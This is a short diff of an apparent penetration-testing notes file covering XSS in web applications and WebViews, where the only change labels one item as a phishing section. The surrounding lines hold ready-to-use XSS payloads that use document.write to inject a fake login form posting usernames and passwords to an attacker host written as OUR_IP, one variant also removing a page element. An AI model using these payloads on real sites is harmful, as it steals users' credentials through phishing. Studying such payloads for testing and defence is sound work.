@@ -393,7 +393,7 @@ In a mobile application, the app may sometimes use a WebView to embed a web appl
 
 **Attacks**
 1. Stored XSS to web application defacing attack
-2. If we have found an xss on the login page then we can write an script that will get us the credentials of the other users (Rxss)
+2. (phishing section) If we have found an xss on the login page then we can write an script that will get us the credentials of the other users (Rxss)
    `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');`
 > (2) this one is the minfied version of the payload
 3. `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`
